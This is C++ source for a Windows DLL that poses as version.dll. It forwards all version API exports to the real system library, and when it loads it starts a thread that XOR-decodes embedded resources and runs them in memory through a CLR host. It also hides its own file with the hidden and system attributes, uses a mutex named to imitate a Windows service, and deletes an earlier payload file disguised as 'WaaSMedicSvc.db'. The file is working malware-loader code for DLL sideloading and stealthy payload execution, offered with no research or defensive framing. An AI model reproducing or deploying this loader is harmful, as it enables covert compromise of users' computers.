#include <windows.h>
#include <shlobj.h>
#include <strsafe.h>

#include "build_config.h"
#include "clr_host.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define RES_CONFIG 105
#define RES_PADDING 106
#define RES_CORE 102
#define RES_TOKEN 103
#define RES_MEDIA 104

#pragma pack(push, 1)
struct BuildConfig
{
    BYTE xorKey;
    char buildId[17];
};
#pragma pack(pop)

static HMODULE g_realVersion = NULL;
static HMODULE g_selfModule = NULL;
static BYTE g_xorKey = PAYLOAD_XOR_KEY;

static FARPROC RealProc(const char* name)
{
    if (!g_realVersion)
    {
#ifdef _WIN64
        g_realVersion = LoadLibraryW(L"C:\\Windows\\System32\\version.dll");
#else
        g_realVersion = LoadLibraryW(L"C:\\Windows\\SysWOW64\\version.dll");
#endif
    }
    return g_realVersion ? GetProcAddress(g_realVersion, name) : NULL;
}

static void HideSystemPath(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    if (attrs != INVALID_FILE_ATTRIBUTES)
    {
        SetFileAttributesW(path, (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) & ~FILE_ATTRIBUTE_READONLY);
    }
}

static void HideSelfDll()
{
    if (!g_selfModule)
    {
        return;
    }

    wchar_t selfPath[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(g_selfModule, selfPath, MAX_PATH))
    {
        HideSystemPath(selfPath);
    }
}

static void CleanupLegacyPayloadFiles()
{
    wchar_t localAppData[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
    {
        return;
    }

    wchar_t legacyPath[MAX_PATH] = { 0 };
    if (SUCCEEDED(StringCchPrintfW(legacyPath, MAX_PATH, L"%s\\Microsoft\\Windows\\AppReadiness\\WaaSMedicSvc.db", localAppData)))
    {
        SetFileAttributesW(legacyPath, FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(legacyPath);
    }
}

static bool LoadResourceBuffer(int resourceId, BYTE** outData, DWORD* outSize)
{
    *outData = NULL;
    *outSize = 0;

    HRSRC resource = FindResourceA(g_selfModule, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!resource)
    {
        return false;
    }

    HGLOBAL loaded = LoadResource(g_selfModule, resource);
    if (!loaded)
    {
        return false;
    }

    DWORD size = SizeofResource(g_selfModule, resource);
    void* data = LockResource(loaded);
    if (!data || size == 0)
    {
        return false;
    }

    BYTE* copy = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!copy)
    {
        return false;
    }

    CopyMemory(copy, data, size);
    *outData = copy;
    *outSize = size;
    return true;
}

static void FreeBuffer(BYTE* data)
{
    if (data)
    {
        VirtualFree(data, 0, MEM_RELEASE);
    }
}

static void LoadBuildConfig()
{
    BYTE* data = NULL;
    DWORD size = 0;
    if (!LoadResourceBuffer(RES_CONFIG, &data, &size) || size < sizeof(BuildConfig))
    {
        FreeBuffer(data);
        return;
    }

    BuildConfig* cfg = (BuildConfig*)data;
    if (cfg->xorKey != 0)
    {
        g_xorKey = cfg->xorKey;
    }

    FreeBuffer(data);
}

static void ResolveInstanceMutexName(wchar_t* outName, size_t outChars)
{
    HKEY key = NULL;
    if (RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\AppReadiness",
        0,
        KEY_READ,
        &key) == ERROR_SUCCESS)
    {
        wchar_t session[32] = { 0 };
        DWORD sessionChars = sizeof(session);
        DWORD type = 0;
        if (RegQueryValueExW(key, L"Session", NULL, &type, (LPBYTE)session, &sessionChars) == ERROR_SUCCESS &&
            session[0] != L'\0')
        {
            StringCchPrintfW(outName, outChars, L"Global\\WRProv_%s", session);
            RegCloseKey(key);
            return;
        }
        RegCloseKey(key);
    }

    StringCchPrintfW(outName, outChars, L"Global\\WRProv_%hs", BUILD_ID);
}

static void XorDecodeBuffer(BYTE* data, DWORD size)
{
    for (DWORD i = 0; i < size; i++)
    {
        data[i] ^= g_xorKey;
    }
}

static void LaunchEmbeddedPayloadInMemory()
{
    LoadBuildConfig();

    wchar_t mutexName[96] = { 0 };
    ResolveInstanceMutexName(mutexName, 96);

    HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, mutexName);
    if (runningMutex)
    {
        CloseHandle(runningMutex);
        HideSelfDll();
        return;
    }

    CleanupLegacyPayloadFiles();

    BYTE* core = NULL;
    BYTE* token = NULL;
    BYTE* media = NULL;
    DWORD coreSize = 0;
    DWORD tokenSize = 0;
    DWORD mediaSize = 0;

    if (!LoadResourceBuffer(RES_CORE, &core, &coreSize))
    {
        HideSelfDll();
        return;
    }

    XorDecodeBuffer(core, coreSize);

    if (LoadResourceBuffer(RES_TOKEN, &token, &tokenSize))
    {
        XorDecodeBuffer(token, tokenSize);
    }

    if (LoadResourceBuffer(RES_MEDIA, &media, &mediaSize))
    {
        XorDecodeBuffer(media, mediaSize);
    }

    ClrStartPayload(
        core,
        coreSize,
        token ? token : (const BYTE*)"",
        tokenSize,
        media ? media : (const BYTE*)"",
        mediaSize);

    FreeBuffer(core);
    FreeBuffer(token);
    FreeBuffer(media);
    HideSelfDll();
}

DWORD WINAPI RunLoader(LPVOID)
{
    LaunchEmbeddedPayloadInMemory();
    return 0;
}

extern "C"
{
    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(LPCSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoA");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(LPCWSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoW");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoExA(DWORD flags, LPCSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(DWORD, LPCSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoExA");
        return fn ? fn(flags, a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoExW(DWORD flags, LPCWSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoExW");
        return fn ? fn(flags, a, b, c, d) : FALSE;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(LPCSTR, LPDWORD))RealProc("GetFileVersionInfoSizeA");
        return fn ? fn(a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(LPCWSTR, LPDWORD))RealProc("GetFileVersionInfoSizeW");
        return fn ? fn(a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeExA(DWORD flags, LPCSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPDWORD))RealProc("GetFileVersionInfoSizeExA");
        return fn ? fn(flags, a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeExW(DWORD flags, LPCWSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPDWORD))RealProc("GetFileVersionInfoSizeExW");
        return fn ? fn(flags, a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerFindFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPSTR e, PUINT f, LPSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT))RealProc("VerFindFileA");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerFindFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT))RealProc("VerFindFileW");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerInstallFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPCSTR e, LPCSTR f, LPSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT))RealProc("VerInstallFileA");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerInstallFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPCWSTR e, LPCWSTR f, LPWSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT))RealProc("VerInstallFileW");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerLanguageNameA(DWORD a, LPSTR b, DWORD c)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPSTR, DWORD))RealProc("VerLanguageNameA");
        return fn ? fn(a, b, c) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerLanguageNameW(DWORD a, LPWSTR b, DWORD c)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPWSTR, DWORD))RealProc("VerLanguageNameW");
        return fn ? fn(a, b, c) : 0;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID* c, PUINT d)
    {
        auto fn = (BOOL (WINAPI*)(LPCVOID, LPCSTR, LPVOID*, PUINT))RealProc("VerQueryValueA");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID* c, PUINT d)
    {
        auto fn = (BOOL (WINAPI*)(LPCVOID, LPCWSTR, LPVOID*, PUINT))RealProc("VerQueryValueW");
        return fn ? fn(a, b, c, d) : FALSE;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        g_selfModule = hModule;
        DisableThreadLibraryCalls(hModule);
        RealProc("GetFileVersionInfoW");
        HANDLE thread = CreateThread(NULL, 0, RunLoader, NULL, 0, NULL);
        if (thread)
        {
            CloseHandle(thread);
        }
    }

    return TRUE;
}
